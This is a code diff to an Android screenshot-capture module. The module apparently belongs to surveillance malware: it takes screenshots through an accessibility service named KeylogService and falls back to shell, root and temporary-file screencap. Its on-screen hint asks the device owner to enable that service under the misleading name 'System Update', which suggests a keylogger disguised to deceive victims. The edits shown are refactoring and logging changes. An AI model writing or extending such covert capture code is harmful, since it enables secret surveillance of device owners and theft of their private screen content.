@@ -1,13 +1,11 @@
 package com.openaccess.sdk.service
 
-import android.accessibilityservice.AccessibilityService
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Build
 import android.util.Log
 import java.io.ByteArrayOutputStream
 import java.io.File
-import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
 class ScreenshotModule(private val context: android.content.Context) {
@@ -26,9 +24,9 @@ class ScreenshotModule(private val context: android.content.Context) {
     fun capture(callback: Callback) {
         Log.d(TAG, "start")
 
-        // 1. AccessibilityService (Android 14+) — most reliable on modern devices
+        // 1. AccessibilityService screenshot (Android 14+) — most reliable
         if (Build.VERSION.SDK_INT >= 34) {
-            Log.d(TAG, "trying accessibility")
+            Log.d(TAG, "trying accessibility screenshot")
             val svc = KeylogService.instance
             if (svc != null) {
                 captureAccessibility(callback)
@@ -37,7 +35,7 @@ class ScreenshotModule(private val context: android.content.Context) {
             Log.d(TAG, "accessibility service not available")
         }
 
-        // 2. Direct screencap — works on rooted devices or some emulators
+        // 2. Direct screencap via stdout pipe
         Log.d(TAG, "trying direct screencap")
         val directResult = captureDirect()
         if (directResult != null) {
@@ -62,16 +60,15 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
 
         val hint = if (Build.VERSION.SDK_INT >= 34) {
-            "Enable Accessibility Service: Settings → Accessibility → System Update → ON"
+            "Enable Accessibility: Settings → Accessibility → System Update → ON"
         } else {
-            "Requires root. On emulator: enable root in AVD settings or use Android 14+ with Accessibility"
+            "Requires root. Enable root in AVD settings or use Android 14+ with Accessibility"
         }
         callback.onFailure("Screenshot failed. $hint")
     }
 
     private fun captureDirect(): ByteArray? {
         return try {
-            // Try screencap to stdout (pipe)
             val proc = ProcessBuilder("sh", "-c", "screencap -p")
                 .redirectErrorStream(true)
                 .start()
@@ -80,6 +77,7 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
+            Log.d(TAG, "direct screencap: ${bytes.size} bytes")
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Direct failed: ${e.message}")
@@ -97,6 +95,7 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
+            Log.d(TAG, "root screencap: ${bytes.size} bytes")
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Root failed: ${e.message}")
@@ -107,7 +106,6 @@ class ScreenshotModule(private val context: android.content.Context) {
     private fun captureViaTmp(): ByteArray? {
         return try {
             val tmpFile = File("/data/local/tmp/screen_${System.currentTimeMillis()}.png")
-            // Try to screencap to /data/local/tmp which is world-writable on some emulators
             val proc = ProcessBuilder("sh", "-c", "screencap -p ${tmpFile.absolutePath}")
                 .redirectErrorStream(true)
                 .start()
@@ -120,6 +118,7 @@ class ScreenshotModule(private val context: android.content.Context) {
             val bytes = tmpFile.readBytes()
             tmpFile.delete()
             if (bytes.isEmpty() || bytes.size < 100) return null
+            Log.d(TAG, "tmp screencap: ${bytes.size} bytes")
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Tmp failed: ${e.message}")
@@ -129,25 +128,26 @@ class ScreenshotModule(private val context: android.content.Context) {
 
     private fun captureAccessibility(callback: Callback) {
         val svc = KeylogService.instance ?: run {
-            callback.onFailure("AccessibilityService not active")
+            callback.onFailure("AccessibilityService not running")
             return
         }
         if (Build.VERSION.SDK_INT < 34) {
-            callback.onFailure("Accessibility screenshot requires API 34+")
+            callback.onFailure("Accessibility screenshot requires Android 14+")
             return
         }
-        val exec = Executors.newSingleThreadExecutor()
+        // Call the service's takeScreenshot directly with callback
+        val exec = java.util.concurrent.Executors.newSingleThreadExecutor()
         try {
             svc.takeScreenshot(
                 android.view.Display.DEFAULT_DISPLAY,
                 exec,
-                object : AccessibilityService.TakeScreenshotCallback {
-                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
+                object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
+                    override fun onSuccess(result: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                         try {
-                            val bitmap = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
+                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                             if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); return }
-                            val bytes = ByteArrayOutputStream()
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, bytes)
+                            val bytes = java.io.ByteArrayOutputStream()
+                            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, bytes)
                             bitmap.recycle()
                             callback.onSuccess(bytes.toByteArray())
                         } catch (e: Exception) {
@@ -156,7 +156,6 @@ class ScreenshotModule(private val context: android.content.Context) {
                             exec.shutdown()
                         }
                     }
-
                     override fun onFailure(errorCode: Int) {
                         callback.onFailure("Accessibility screenshot failed: code=$errorCode")
                         exec.shutdown()
